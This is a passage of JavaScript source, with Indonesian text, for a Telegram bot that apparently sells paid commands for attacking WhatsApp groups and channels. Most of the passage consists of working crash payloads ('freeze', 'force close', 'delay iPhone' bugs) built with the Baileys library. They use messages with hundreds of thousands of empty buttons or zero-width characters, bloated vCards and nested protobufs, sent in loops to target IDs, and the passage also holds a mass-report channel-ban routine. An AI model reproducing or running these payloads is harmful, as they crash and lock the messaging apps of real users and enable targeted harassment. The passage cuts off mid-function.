  const finalMessage = ("\n<blockquote>•., ♡ 𝗚 𝗫 𝗜 𝗢 𝗡 ♡¸.•\n ༺༻ <b>CEK ID GROUP WHATSAPP</b>\n\n<tg-emoji emoji-id=\"6028497653799588476\">🛍</tg-emoji> <b>INFO GRUP</b>\n├─ <b>Nama</b> : " + subject + "\n├─ <b>ID Grup</b> : <code>" + groupId + "</code>\n├─ <b>Owner</b> : " + owner + "\n├─ <b>Member</b> : " + participantCount + "\n├─ <b>Size</b> : " + groupSize + "\n├─ <b>Dibuat</b> : " + createdAt + "\n├─ <b>Restrict</b> : " + isRestricted + "\n├─ <b>Announce</b> : " + isAnnounce + "\n├─ <b>Community</b> : " + isCommunity + "\n├─ <b>Comm Announce</b> : " + isCommunityAnnounce + "\n├─ <b>Linked Parent</b> : " + linkedParent + "\n└─ <b>Deskripsi</b> : " + description + "\n\n<tg-emoji emoji-id=\"5990174326337310665\">🗓</tg-emoji> <b>REQUEST INFO</b>\n├─ <b>Waktu</b> : " + requestTime + "\n├─ <b>Request by</b> : <a href=\"tg://user?id=" + sender.id + "\">" + (sender.first_name || "Unknown") + "</a>\n└─ <b>User ID</b> : <code>" + sender.id + "</code></blockquote>\n        ").trim(),
    replyOpts = {};
  replyOpts.disable_web_page_preview = true;
  await ctx.replyWithHTML(finalMessage, replyOpts);
});
bot.command("groupfreeze", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const sender = ctx.from;
  const targetInput = ctx.message.text.split(" ")[1];
  if (!targetInput) return ctx.reply("🪧 Example: /groupfreeze <link_grup_wa>\n🚀 Support: chat.whatsapp.com/xxxxx\n📌 Atau ID grup langsung: 123xxx@g.us\n⚠️ Wajib jeda 5-10 detik antar eksekusi");
  let resolvedGroupId = targetInput.trim();
  if (resolvedGroupId.includes("chat.whatsapp.com/")) {
    const code = resolvedGroupId.split("chat.whatsapp.com/")[1].split(/[?&\s]/)[0];
    resolvedGroupId = code;
  }
  if (!resolvedGroupId.includes("@g.us")) {
    const groupInfo = await (async () => {
      try {
        throw new Error("WA not connected");
        return await botRuntime.sock.groupGetInviteInfo(resolvedGroupId);
      } catch (err) {
        return console.log(chalk.yellow("⚠️ [groupfreeze] " + err.message)), null;
      }
    })();
    if (!groupInfo || !groupInfo.id) {
      return ctx.replyWithHTML("❌ Gagal resolve grup.\nPastikan link invite valid atau bot sudah join grup.");
    }
    resolvedGroupId = groupInfo.id;
  }
  const safeSendBug = async (sender, target) => {
      try {
        throw new Error("WA not connected");
        return await sender(null, target), true;
      } catch (err) {
        return console.log(chalk.yellow("⚠️ [groupfreeze] " + err.message)), false;
      }
    },
    coverImage = "https://files.catbox.moe/ad3fae.jpg";
  const timeOpts = {};
  timeOpts.timeZone = "Asia/Jakarta";
  const caption = ("\n<blockquote>•., ♡ 𝗚 𝗫 𝗜 𝗢 𝗡 ♡¸.•\n ༺༻ <b>GROUPFREEZE EXECUTED</b>\n\n<tg-emoji emoji-id=\"6028497653799588476\">🛍</tg-emoji> <b>TARGET INFO</b>\n├─ <b>Target</b> : <code>" + resolvedGroupId + "</code>\n├─ <b>Input</b> : " + targetInput + "\n├─ <b>Status</b> : ✅ Terkirim\n├─ <b>Effect</b> : Freeze All Member Group\n├─ <b>Request by</b> : <a href=\"tg://user?id=" + sender.id + "\">" + (sender.first_name || "Unknown") + "</a>\n└─ <b>Waktu</b> : " + new Date().toLocaleString("id-ID", timeOpts) + "</blockquote>\n        ").trim(),
    photoOpts = {};
  photoOpts.caption = caption;
  photoOpts.parse_mode = "HTML";
  await ctx.replyWithPhoto(coverImage, photoOpts).catch(async () => {
    await ctx.replyWithHTML(caption).catch(() => {});
  }), (async () => {
    for (let index = 0; index < 50; index++) {
      console.log(chalk.green("Sedang Mengeksekusi Target & Menyiapkan Payloads " + (index + 1) + " TO " + resolvedGroupId));
      await safeSendBug(sendGroupStatusStickerBug, resolvedGroupId);
      await sleep(700 + Math.floor(Math.random() * 800));
    }
  })();
});
bot.command("forceclosegb", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const sender = ctx.from,
    targetInput = ctx.message.text.split(" ")[1];
  if (!targetInput) {
    return ctx.reply("🪧 Example: /forceclosegb <link_grup_wa>\n🚀 Support: chat.whatsapp.com/xxxxx\n📌 Atau ID grup langsung: 123xxx@g.us\n⚠️ Wajib jeda 5-10 detik antar eksekusi");
  }
  let resolvedGroupId = targetInput.trim();
  if (resolvedGroupId.includes("chat.whatsapp.com/")) {
    const code = resolvedGroupId.split("chat.whatsapp.com/")[1].split(/[?&\s]/)[0];
    resolvedGroupId = code;
  }
  if (!resolvedGroupId.includes("@g.us")) {
    const groupInfo = await (async () => {
      try {
        throw new Error("WA not connected");
        return await botRuntime.sock.groupGetInviteInfo(resolvedGroupId);
      } catch (err) {
        return console.log(chalk.yellow("⚠️ [forceclosegb] " + err.message)), null;
      }
    })();
    if (!groupInfo || !groupInfo.id) return ctx.replyWithHTML("❌ Gagal resolve grup.\nPastikan link invite valid atau bot sudah join grup.");
    resolvedGroupId = groupInfo.id;
  }
  const safeSendBug = async (sender, target) => {
      try {
        throw new Error("WA not connected");
        return await sender(null, target), true;
      } catch (err) {
        return console.log(chalk.yellow("⚠️ [forceclosegb] " + err.message)), false;
      }
    },
    coverImage = "https://files.catbox.moe/ad3fae.jpg",
    caption = ("\n<blockquote>•., ♡ 𝗚 𝗫 𝗜 𝗢 𝗡 ♡¸.•\n ༺༻ <b>BLANK GROUP EXECUTED</b>\n\n<tg-emoji emoji-id=\"6028497653799588476\">🛍</tg-emoji> <b>TARGET INFO</b>\n├─ <b>Target</b> : <code>" + resolvedGroupId + "</code>\n├─ <b>Input</b> : " + targetInput + "\n├─ <b>Status</b> : ✅ Terkirim\n├─ <b>Effect</b> : Fc Click Gb\n├─ <b>Request by</b> : <a href=\"tg://user?id=" + sender.id + "\">" + (sender.first_name || "Unknown") + "</a>\n└─ <b>Waktu</b> : " + new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta"
    }) + "</blockquote>\n        ").trim();
  const photoOpts = {};
  photoOpts.caption = caption;
  photoOpts.parse_mode = "HTML";
  await ctx.replyWithPhoto(coverImage, photoOpts).catch(async () => {
    await ctx.replyWithHTML(caption).catch(() => {});
  });
  (async () => {
    for (let index = 0; index < 1; index++) {
      console.log(chalk.green("Sedang Mengeksekusi Target & Menyiapkan Payloads " + (index + 1) + " TO " + resolvedGroupId));
      await safeSendBug(sendAiBotRichResponseCrashBug, resolvedGroupId);
      await sleep(700 + Math.floor(Math.random() * 800));
    }
  })();
});
bot.command("lockGroup", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const sender = ctx.from;
  const targetInput = ctx.message.text.split(" ")[1];
  if (!targetInput) return ctx.reply("🪧 Example: /lockGroup <link_grup_wa>\n🚀 Support: chat.whatsapp.com/xxxxx\n📌 Atau ID grup langsung: 123xxx@g.us\n⚠️ Wajib jeda 5-10 detik antar eksekusi");
  let resolvedGroupId = targetInput.trim();
  if (resolvedGroupId.includes("chat.whatsapp.com/")) {
    const code = resolvedGroupId.split("chat.whatsapp.com/")[1].split(/[?&\s]/)[0];
    resolvedGroupId = code;
  }
  if (!resolvedGroupId.includes("@g.us")) {
    const groupInfo = await (async () => {
      try {
        throw new Error("WA not connected");
        return await botRuntime.sock.groupGetInviteInfo(resolvedGroupId);
      } catch (err) {
        return console.log(chalk.yellow("⚠️ [lockGroup] " + err.message)), null;
      }
    })();
    if (!groupInfo || !groupInfo.id) return ctx.replyWithHTML("❌ Gagal resolve grup.\nPastikan link invite valid atau bot sudah join grup.");
    resolvedGroupId = groupInfo.id;
  }
  const safeSendBug = async (sender, target) => {
    try {
      throw new Error("WA not connected");
      return await sender(null, target), true;
    } catch (err) {
      return console.log(chalk.yellow("⚠️ [lockGroup] " + err.message)), false;
    }
  };
  const coverImage = "https://files.catbox.moe/ocb5gy.jpg",
    caption = ("\n<blockquote>•., ♡ 𝗚 𝗫 𝗜 𝗢 𝗡 ♡¸.•\n ༺༻ <b>LOCKS CHAT GROUP EXECUTED</b>\n\n<tg-emoji emoji-id=\"6028497653799588476\">🛍</tg-emoji> <b>TARGET INFO</b>\n├─ <b>Target</b> : <code>" + resolvedGroupId + "</code>\n├─ <b>Input</b> : " + targetInput + "\n├─ <b>Status</b> : ✅ Terkirim\n├─ <b>Effect</b> : Lock Chat Group Worth It\n├─ <b>Request by</b> : <a href=\"tg://user?id=" + sender.id + "\">" + (sender.first_name || "Unknown") + "</a>\n└─ <b>Waktu</b> : " + new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta"
    }) + "</blockquote>\n        ").trim();
  const photoOpts = {};
  photoOpts.caption = caption;
  photoOpts.parse_mode = "HTML";
  await ctx.replyWithPhoto(coverImage, photoOpts).catch(async () => {
    await ctx.replyWithHTML(caption).catch(() => {});
  }), (async () => {
    for (let index = 0; index < 1; index++) {
      console.log(chalk.green("Sedang Mengeksekusi Target & Menyiapkan Payloads " + (index + 1) + " TO " + resolvedGroupId));
      await safeSendBug(sendBotForwardedHtmlCrashBug, resolvedGroupId);
      await sleep(700 + Math.floor(Math.random() * 800));
    }
  })();
});
bot.command("XbanCh", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const targetInput = ctx.message.text.split(" ")[1];
  if (!targetInput) {
    const tableOpts = {};
    tableOpts.bordered = true;
    tableOpts.striped = true;
    tableOpts.hasHeader = true;
    const richMessage = new RichHTMLBuilder()
      .heading(2, "📢 BAN CHANNEL WHATSAPP")
      .divider()
      .paragraph("<blockquote>Banned ke Channel WhatsApp target.</blockquote>")
      .divider()
      .table([
        ["INFORMASI", "DETAIL"],
        ["Format", "<code>/XbanCh &lt;link_channel&gt;</code>"],
        ["Contoh", "<code>/XbanCh https://whatsapp.com/channel/0029VbEUZ0IEVccPyECDJK05</code>"],
        ["Syarat", "Sender wajib menjadi <b>Admin</b> di channel target"]
      ], tableOpts)
      .divider()
      .paragraph("<i>⚠️ Tanpa akses admin, pesan akan otomatis di-drop oleh server WA.</i>")
      .build();
    return ctx.sendRichMessage(richMessage);
  }
  let cleanedInput = targetInput.trim();
  let channelJid = "";
  if (cleanedInput.includes("whatsapp.com/channel/")) {
    const code = cleanedInput.split("whatsapp.com/channel/")[1].split(/[?&\s]/)[0];
    channelJid = code + "@newsletter";
  } else !cleanedInput.includes("@") ? channelJid = cleanedInput + "@newsletter" : channelJid = cleanedInput;
  const statusMessage = await ctx.replyWithHTML("<blockquote>🔍 <b>CHECKING CHANNEL...</b></blockquote>\n<b>Target :</b> <code>" + channelJid + "</code>\n<b>Status :</b> <i>Mengecek metadata & akses admin...</i>");
  try {
    const channelMeta = await botRuntime.sock.newsletterMetadata("invite", channelJid.split("@")[0]).catch(() => null);
    if (!channelMeta) {
      const failOpts = {};
      failOpts.parse_mode = "HTML";
      await ctx.telegram.editMessageText(ctx.chat.id, statusMessage.message_id, undefined, "<blockquote>❌ <b>CHANNEL TIDAK DITEMUKAN</b></blockquote>\nPastikan link channel valid dan bisa diakses.", failOpts);
      return;
    }
    const isAdmin = channelMeta.viewer_metadata?.["role"] === "ADMIN" || channelMeta.viewer_metadata?.["is_admin"] === true;
    if (!isAdmin) {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMessage.message_id, undefined, "<blockquote>⚠️ <b>AKSES DITOLAK</b></blockquote>\n<b>Channel :</b> <code>" + (channelMeta.name || channelJid) + "</code>\n<b>Role Bot :</b> <i>" + (channelMeta.viewer_metadata?.["role"] || "SUBSCRIBER") + "</i>\n\nSender tidak memiliki akses <b>Admin</b> di channel ini.", {
        parse_mode: "HTML"
      });
      return;
    }
    const progressOpts = {};
    progressOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageText(ctx.chat.id, statusMessage.message_id, undefined, "<blockquote>⏳ <b>MEMPROSES BAN CHANNEL</b></blockquote>\n<b>Channel :</b> <code>" + (channelMeta.name || channelJid) + "</code>\n<b>Role :</b> <i>ADMIN</i>\n<b>Status :</b> <i>Mengeksekusi Function...</i>", progressOpts), await sendChannelBanReports(null, channelJid);
    const tableOpts = {};
    tableOpts.bordered = true;
    tableOpts.striped = true;
    tableOpts.hasHeader = true;
    const richMessage = new RichHTMLBuilder()
      .heading(2, "✅ BAN CHANNEL SELESAI")
      .divider()
      .table([
        ["Informasi", "Detail"],
        ["Channel", "<code>" + (channelMeta.name || channelJid) + "</code>"],
        ["Subscriber", channelMeta.subscribers ? channelMeta.subscribers.toString() : "-"],
        ["Method", "Auto Report"],
        ["Status", "✅ Sukses Banned"],
        ["Effect", "BANNED CHANEL"],
        ["Waktu", new Date().toLocaleString("id-ID", {
          timeZone: "Asia/Jakarta"
        })]
      ], tableOpts)
      .divider()
      .paragraph("<i>Payload berhasil dikirim secara berulang ke channel target.</i>")
      .build();
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMessage.message_id).catch(() => {}), await ctx.sendRichMessage(richMessage);
  } catch (err) {
    const failOpts = {};
    failOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageText(ctx.chat.id, statusMessage.message_id, undefined, "❌ <b>Gagal:</b> " + err.message, failOpts);
  }
});
async function sendGroupStatusStickerBug(sock, targetJid) {
  const helper = {};
  helper.makePadding = " maklo ";
  helper.crashMessage = "one_crash_message";
  helper.messageIdPrefix = "DXC";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  helper.statusBroadcast = "status@broadcast";
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.concat3 = function (a, b) {
    return a + b;
  };
  const H = helper;
  const body1 = {};
  body1.text = "";
  const buttonsArray1 = {};
  buttonsArray1.length = 500000;
  const payload1 = {
    message: {
      interactiveMessage: {
        body: body1,
        nativeFlowMessage: {
          buttons: Array.from(buttonsArray1, () => ({}))
        }
      }
    }
  };
  const body2 = {};
  body2.text = H.makePadding;
  const payload2 = {
      message: {
        interactiveMessage: {
          body: body2,
          nativeFlowMessage: {
            buttons: "ြ".repeat(600000)
          }
        }
      }
    },
    body3 = {};
  body3.text = "࿗";
  const payload3 = {
      message: {
        interactiveMessage: {
          body: body3,
          nativeFlowMessage: {
            buttons: H.crashMessage.repeat(20000)
          }
        }
      }
    },
    messageIdBase = H.messageIdPrefix + Date.now().toString(36).toUpperCase(),
    wrap1 = {};
  wrap1.message = payload1.message;
  const relayOpts1 = {};
  relayOpts1.groupStatusMessageV2 = wrap1;
  await sock.relayMessage(H.statusBroadcast, relayOpts1, {
    messageId: H.concat(messageIdBase, "_1"),
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: []
        }]
      }]
    }]
  });
  const wrap2 = {};
  wrap2.message = payload2.message;
  const relayOpts2 = {};
  relayOpts2.groupStatusMessageV2 = wrap2;
  await sock.relayMessage(H.statusBroadcast, relayOpts2, {
    messageId: H.concat2(messageIdBase, "_2"),
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: []
        }]
      }]
    }]
  });
  const wrap3 = {};
  wrap3.message = payload3.message;
  const relayOpts3 = {};
  relayOpts3.groupStatusMessageV2 = wrap3;
  await sock.relayMessage(H.statusBroadcast, relayOpts3, {
    messageId: H.concat3(messageIdBase, "_3"),
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: []
        }]
      }]
    }]
  });
}
async function sendNativeFlowCrashBug(sock, targetJid) {
  const body = {};
  body.text = "X";
  const outerArray = {};
  outerArray.length = 500000;
  const innerArray = {};
  innerArray.length = 500000;
  const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: body,
            nativeFlowMessage: {
              buttons: Array.from(outerArray, () => ({})),
              nativeFlowResponsMessage: {
                buttons: Array.from(innerArray, () => ({}))
              }
            }
          }
        }
      }
    },
    relayOpts = {};
  relayOpts.noSelfSync = true;
  await sock.relayMessage(targetJid, payload, relayOpts);
}
async function sendCrashIosAmposBug(sock, targetJid) {
  const helper = {};
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.contactPrefix = "🎭⃟༑⌁⃰CrashIosAmpos🐉";
  helper.repeatChar = "𑇂𑆵𑆴𑆿";
  const H = helper;
  await sock.relayMessage(targetJid, {
    contactMessage: {
      displayName: H.concat(H.contactPrefix, H.repeatChar.repeat(10000)),
      vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;𑇂𑆵𑆴𑆿" + H.repeatChar.repeat(10000) + ";;;\nFN:𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(10000) + "\nNICKNAME:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nORG:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nTITLE:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + ";;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nPHOTO;" + null + "\nX-WA-BIZ-NAME:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\nEND:VCARD",
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\0".repeat(100000),
          greetingMessageBody: "TheEnd"
        }
      }
    }
  }, {
    participant: {
      jid: targetJid
    }
  });
}
async function sendDelayIphoneBug(sock, targetJid) {
  const helper = {};
  helper.unknownProvider = "UNKNOWN";
  helper.sourceTag = "KaoxTzy";
  helper.primitiveTag = "GenAIMarkdownTextUXPrimitive";
  helper.layoutTag = "GenAISingleLayoutViewModel";
  helper.botJid = "0@bot";
  helper.forwardType = "EXPLICIT";
  const H = helper;
  const sourceInfo = {};
  sourceInfo.provider = H.unknownProvider;
  sourceInfo.sourceQuery = "";
  sourceInfo.citationNumber = 1;
  sourceInfo.sourceTitle = H.sourceTag;
  const sourcesWrap = {};
  sourcesWrap.sources = [sourceInfo];
  const metaInfo = {};
  metaInfo.richResponseSourcesMetadata = sourcesWrap;
  const bodyArray = {};
  bodyArray.length = 200900;
  const payload = {
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32),
      messageUUID: crypto.randomUUID(),
      sessionId: crypto.randomUUID(),
      ticketId: crypto.randomUUID(),
      receiverAccountType: "HOSTED",
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: metaInfo
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{
            messageType: 2,
            messageText: Array.from(bodyArray, () => ({}))
          }],
          unifiedResponse: {
            data: Buffer.from(JSON.stringify({
              response_id: crypto.randomUUID(),
              sections: [{
                view_model: {
                  primitive: {
                    text: "==." + "\n".repeat(10000) + ".==",
                    __typename: H.primitiveTag
                  },
                  __typename: H.layoutTag
                }
              }]
            })).toString("base64")
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: H.botJid
            },
            forwardOrigin: 4,
            quotedType: H.forwardType
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, payload, {
    participant: {
      jid: targetJid
    }
  });
}
async function sendFreezeIosBug(sock, targetJid) {
  const {
    generateWAMessageFromContent
  } = require("@whiskeysockets/baileys");
  const body = {};
  body.text = "X$_message";
  const buttonArray1 = {};
  buttonArray1.length = 500000;
  const interactiveMsg1 = generateWAMessageFromContent(targetJid, {
    interactiveMessage: {
      body: body,
      nativeFlowMessage: {
        buttons: Array.from(buttonArray1, () => ({}))
      }
    }
  }, {});
  const buttonArray2 = {};
  buttonArray2.length = 500000;
  const interactiveMsg2 = generateWAMessageFromContent(targetJid, {
      interactiveMessage: {
        body: {
          text: "default_yes",
          format: "DEFAULT"
        },
        nativeFlowMessage: {
          buttons: [{
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "new_media_click_here",
              url: "https://t.me/Bawzzhhh"
            })
          }],
          messageParamsJson: "{}"
        },
        contextInfo: {
          urlTrackingMap: {
            urlTrackingMapElements: Array.from(buttonArray2, (item, index) => ({
              url: "Bawzzhhh"
            }))
          }
        }
      }
    }, {}),
    array3 = {};
  array3.length = 1236;
  const array4 = {};
  array4.length = 5055;
  const interactiveMsg3 = generateWAMessageFromContent(targetJid, {
      interactiveResponseMessage: {
        body: {
          text: "SINGLE_SELECT_FORUMS",
          footer: "forums_message_id"
        },
        nativeFlowMessage: {
          buttons: "one_crash_message".repeat(40000),
          nativeFlowResponseMessage: {
            buttons: Array.from(array3, () => ({}))
          }
        },
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            icon: "document",
            title: "°Delay?°¿",
            sections: Array.from(array4, () => ({}))
          })
        }
      }
    }, {}),
    wrap1 = {};
  wrap1.message = interactiveMsg1.message;
  const relayOpts1 = {};
  relayOpts1.groupStatusMessageV2 = wrap1;
  const opts1 = {};
  opts1.statusJidList = [targetJid];
  opts1.participant = {};
  opts1.participant.jid = targetJid;
  await sock.relayMessage("status@broadcast", relayOpts1, opts1);
  const wrap2 = {};
  wrap2.message = interactiveMsg2.message;
  const relayOpts2 = {};
  relayOpts2.groupStatusMessageV2 = wrap2;
  const opts2 = {};
  opts2.statusJidList = [targetJid];
  opts2.participant = {};
  opts2.participant.jid = targetJid;
  await sock.relayMessage("status@broadcast", relayOpts2, opts2);
  const wrap3 = {};
  wrap3.message = interactiveMsg3.message;
  const relayOpts3 = {};
  relayOpts3.groupStatusMessageV2 = wrap3;
  const opts3 = {};
  opts3.statusJidList = [targetJid];
  opts3.participant = {};
  opts3.participant.jid = targetJid;
  await sock.relayMessage("status@broadcast", relayOpts3, opts3);
}
async function sendCrashIphoneNewVersionBug(sock, targetJid) {
  const helper = {};
  helper.text = "IkyyJomblo";
  const H = helper;
  const encodedMessage = proto.Message.encode(proto.Message.fromObject({
      interactiveMessage: {
        body: {
          text: H.text
        },
        contextInfo: {
          isForwarded: true,
          buffer1: Buffer.from([0, 0, 0, 1]),
          buffer2: Buffer.from([255, 0, 0, 29]),
          buffer3: Buffer.from([255, 0, 0, 30]),
          buffer4: Buffer.from([255, 0, 0, 31]),
          buffer5: Buffer.from([255, 0, 0, 32])
        },
        XForwardedFor: Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "\r\n"
      }
    })).finish(),
    tags = [
      [186, 3],
      [210, 4],
      [170, 2]
    ];
  const varintEncode = function (value) {
      let bytes = [];
      while (value >= 128) {
        bytes.push(value & 127 | 128), value >>>= 7;
      }
      bytes.push(value);
      return Buffer.from(bytes);
    },
    lengthDelimited = function (tag, buf) {
      return Buffer.concat([Buffer.from(tag), varintEncode(buf.length), buf]);
    },
    wrapRepeated = function (tag, count) {
      let out = encodedMessage;
      for (let i = 0; i < count; i++) {
        out = lengthDelimited(tag, lengthDelimited([10], out));
      }
      return out;
    },
    normalizeJid = function (raw) {
      let text = String(raw || "").trim();
      if (text.includes("@")) return text;
      return text.replace(/\D/g, "") + "@s.whatsapp.net";
    },
    targetList = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(normalizeJid).filter(item => item.length > 15);
  if (!targetList.length) return;
  const batchSize = 5,
    batchDelay = 5000;
  let sentCount = 0;
  for (let groupStart = 0; groupStart < targetList.length; groupStart += batchSize) {
    const batchTargets = targetList.slice(groupStart, groupStart + batchSize);
    groupStart > 0 && (await new Promise(resolve => setTimeout(resolve, batchDelay)));
    const batchIndex = Math.floor(groupStart / batchSize) + 1,
      suffix = batchIndex > 1 ? "-" + batchIndex : "",
      messageIdBase = "crb" + Date.now().toString(36).toUpperCase() + suffix;
    for (let tagIndex = 0; tagIndex < tags.length; tagIndex++) {
      const tag = tags[tagIndex];
      let decoded = null;
      for (let size = 5000; size >= 2000 && !decoded; size -= 400) {
        try {
          decoded = proto.Message.decode(wrapRepeated(tag, size));
          proto.Message.encode(decoded).finish();
        } catch {}
      }
      if (!decoded) continue;
      await sock.relayMessage("status@broadcast", decoded, {
        messageId: messageIdBase,
        statusJidList: batchTargets,
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: batchTargets.map(target => ({
              tag: "to",
              attrs: {
                jid: target
              },
              content: []
            }))
          }]
        }]
      }), sentCount++;
    }
  }
}
async function sendKayzenFreezeBug(sock, targetJid) {
  const payload = {
    locationMessage: {
      name: "\0" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\0" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    }
  };
  const generatedMessage = await generateWAMessageFromContent(targetJid, payload, {});
  await sock.relayMessage("status@broadcast", generatedMessage.message, {
    messageId: generatedMessage.key.id,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  }), console.log("[applexcrash] ✅ bug terkirim ke — Target: " + targetJid);
}
async function sendDprasuBug(sock, targetJid) {
  const relayOpts = {};
  relayOpts.noSelfSync = true;
  relayOpts.waitForAck = false;
  const H = relayOpts,
    delay = ms => new Promise(resolve => setTimeout(resolve, ms)),
    repeatChar = (char, times) => {
      let result = "";
      for (let i = 0; i < times; i++) result += char;
      return result;
    },
    repeatChar2 = (char, times) => {
      let result = "";
      for (let i = 0; i < times; i++) result += char;
      return result;
    },
    zeroWidth = "​";
  const zeroWidth2 = "‌",
    zeroWidth3 = "‍",
    zeroWidth4 = "⁠",
    tagMatrix = [
      [186, 4],
      [210, 5],
      [170, 3],
      [138, 6],
      [146, 7]
    ],
    varintEncode = function (value) {
      const helper = {};
      helper.finish = "finish";
      helper.error = "error";
      const H = helper;
      let bytes = [];
      while (value >= 128) {
        bytes.push(value & 127 | 128), value >>>= 7;
      }
      bytes.push(value);
      return Buffer.from(bytes);
    },
    lengthDelimited = function (tag, buf) {
      return Buffer.concat([Buffer.from(tag), varintEncode(buf.length), buf]);
    },
    normalizeJid = function (raw) {
      let text = String(raw || "").trim();
      if (text.includes("@")) return text;
      return text.replace(/\D/g, "") + "@s.whatsapp.net";
    };
  const targetList = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(normalizeJid).filter(item => item.length > 15);
  if (!targetList.length) return;
  let sentCounter = 0;
  for (let i = 0; i < 100; i++) {
    try {
      const payload = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                title: repeatChar(zeroWidth, 50000),
                subtitle: repeatChar(zeroWidth2, 50000),
                hasMediaAttachment: false,
                width: 0,
                height: 0,
                bloksWidget: {
                  uuid: repeatChar(zeroWidth, 50000),
                  data: repeatChar("[", 50001),
                  type: repeatChar(zeroWidth4, 50000),
                  fallback: repeatChar(zeroWidth3, 50000)
                }
              },
              body: {
                text: repeatChar(zeroWidth, 30000)
              },
              nativeFlowMessage: {
                buttons: repeatChar("[", 50000)
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, payload, H), sentCounter++, console.log("Error Bre[" + sentCounter + "]");
    } catch (err) {
      console.log("Error Woy err: " + err.message);
    }
  }
  const arrayLen = {};
  arrayLen.length = 10000;
  const bigPayload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: repeatChar2(zeroWidth, 90000) + "ReymonNewEra",
              subtitle: repeatChar2(zeroWidth, 90000) + zeroWidth2 + zeroWidth3,
              hasMediaAttachment: false
            },
            body: {
              text: repeatChar2(zeroWidth, 90000) + zeroWidth4 + repeatChar2("", 50000)
            },
            footer: {
              text: repeatChar2(zeroWidth, 50000) + zeroWidth2 + repeatChar2(zeroWidth, 50000)
            },
            nativeFlowMessage: {
              buttons: repeatChar2(zeroWidth, 500000) + zeroWidth3 + zeroWidth4,
              messageParamsJson: repeatChar2(zeroWidth, 90000)
            },
            contextInfo: {
              mentionedJid: Array.from(arrayLen, () => ""),
              forwardingScore: 9999,
              isForwarded: true,
              participant: targetJid,
              deviceJid: targetJid
            }
          }
        }
      }
    },
    encodedBig = proto.Message.encode(proto.Message.fromObject(bigPayload)).finish();
  const wrapRepeated = function (tag, count) {
    let out = encodedBig;
    for (let i = 0; i < count; i++) out = lengthDelimited(tag, lengthDelimited([10], out));
    return out;
  };
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(targetJid, bigPayload, {
      participant: {
        jid: targetJid
      }
    }).catch(() => {}), await delay(500);
  }
  for (let groupStart = 0; groupStart < targetList.length; groupStart += 5) {
    const batchTargets = targetList.slice(groupStart, groupStart + 5);
    if (groupStart > 0) await delay(5000);
    const batchIndex = Math.floor(groupStart / 5) + 1,
